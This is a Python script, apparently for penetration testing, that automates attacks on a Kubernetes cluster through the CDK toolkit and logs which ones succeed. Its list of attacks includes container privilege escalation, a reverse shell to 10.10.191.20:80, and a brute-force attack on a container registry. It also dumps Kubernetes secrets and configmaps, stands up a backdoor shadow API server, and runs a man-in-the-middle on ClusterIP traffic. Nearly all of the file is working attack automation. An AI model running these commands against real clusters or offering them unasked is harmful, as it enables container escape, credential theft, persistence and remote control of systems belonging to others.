#!/usr/bin/env python3
import os
import subprocess
import re

LOG_DIR = "/usr/local/bin/logs"
APPLIED_VECTORS_FILE = os.path.join(LOG_DIR, "applied_vectors.txt")
os.makedirs(LOG_DIR, exist_ok=True)

# Очистка файла для записи применимых векторов
with open(APPLIED_VECTORS_FILE, "w") as f:
    f.write("[+] Applied Vectors:\n")

def write_to_log(filename, content):
    with open(filename, "a") as log_file:
        log_file.write(content + "\n")

def write_to_applied_vectors(vector_name, vector_category):
    with open(APPLIED_VECTORS_FILE, "a") as f:
        f.write(f"[PASS] Category: {vector_category}, Name: {vector_name}\n")

def run_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode("utf-8")
        return output
    except subprocess.CalledProcessError as e:
        return f"Error: {e.output.decode('utf-8')}"

def analyze_log(log_file, test_name, vector_category, vector_name):
    with open(log_file, "r") as log:
        content = log.read()
        if re.search(r"Invalid Input Args|exploit only suitable|403|Forbidden|Error|failed|faild", content, re.IGNORECASE):
            print(f"[FAIL] {test_name} (Category: {vector_category}, Name: {vector_name}): Exploitation unsuccessful.")
            write_to_log(log_file, f"[FAIL] {test_name} (Category: {vector_category}, Name: {vector_name}): Exploitation unsuccessful.")
        else:
            print(f"[PASS] {test_name} (Category: {vector_category}, Name: {vector_name}): Exploitation successful. Log saved to {log_file}")
            write_to_log(log_file, f"[PASS] {test_name} (Category: {vector_category}, Name: {vector_name}): Exploitation successful.")
            write_to_applied_vectors(vector_name, vector_category)

def run_test(command, log_file, test_name, vector_category, vector_name):
    print(f"[+] Running test: {test_name} (Category: {vector_category}, Name: {vector_name})")
    output = run_command(command)
    write_to_log(log_file, output)
    analyze_log(log_file, test_name, vector_category, vector_name)

def main():
    print("[+] Starting Kubernetes cluster exploitation tests...")

    tests = [
        {"name": "LXCFS Privilege Test", "command": "cdk run lxcfs-rw", "log": "lxcfs_rw.log", "category": "Privilege Escalation", "vector": "HostPath mount"},
        {"name": "Rewrite Cgroup Devices Test", "command": "cdk run rewrite-cgroup-devices", "log": "rewrite_cgroup_devices.log", "category": "Privilege Escalation", "vector": "HostPath mount"},
        {"name": "Abuse Unprivileged UserNS Test", "command": "cdk run abuse-unpriv-userns \"shell-cmd-payloads\"", "log": "abuse_unpriv_userns.log", "category": "Privilege Escalation", "vector": "Privileged container"},
        {"name": "Istio Check Test", "command": "cdk run istio-check", "log": "istio_check.log", "category": "Discovery", "vector": "Network mapping"},
        {"name": "K8S PSP Dump Test", "command": "cdk run k8s-psp-dump auto", "log": "k8s_psp_dump.log", "category": "Discovery", "vector": "Access Kubernetes API server"},
        {"name": "Reverse Shell Test", "command": "cdk run reverse-shell 10.10.191.20:80", "log": "reverse_shell.log", "category": "Execution", "vector": "Bash/cmd inside container"},
        {"name": "Registry Brute Force Test", "command": "cdk run registry-brute http://docker.xxxxx admin /tmp/password-list", "log": "registry_brute.log", "category": "Credential Access", "vector": "Container service account"},
        {"name": "K8S Secrets Dump Test", "command": "cdk run k8s-secret-dump auto", "log": "k8s_secrets_dump.log", "category": "Credential Access", "vector": "List K8S secrets"},
        {"name": "K8S ConfigMap Dump Test", "command": "cdk run k8s-configmap-dump auto", "log": "k8s_configmap_dump.log", "category": "Credential Access", "vector": "Container service account"},
        {"name": "K8S Shadow API Server Test", "command": "cdk run k8s-shadow-apiserver default", "log": "k8s_shadow_api_server.log", "category": "Persistence", "vector": "Backdoor container"},
        {"name": "K8S MITM ClusterIP Test", "command": "cdk run k8s-mitm-clusterip default ubuntu 9.9.9.9 80", "log": "k8s_mitm_clusterip.log", "category": "Persistence", "vector": "Backdoor container"},
        {"name": "K8S CronJob Test", "command": "cdk run k8s-cronjob default min alpine \"echo hello; echo cronjob\"", "log": "k8s_cronjob.log", "category": "Persistence", "vector": "Writable hostPath mount"}
    ]

    for test in tests:
        log_file = os.path.join(LOG_DIR, test["log"])
        run_test(test["command"], log_file, test["name"], test["category"], test["vector"])

    print(f"[+] All tests completed. Logs are available in {LOG_DIR}.")
    print(f"[+] Applied vectors are listed in {APPLIED_VECTORS_FILE}.")

if __name__ == "__main__":
    main()

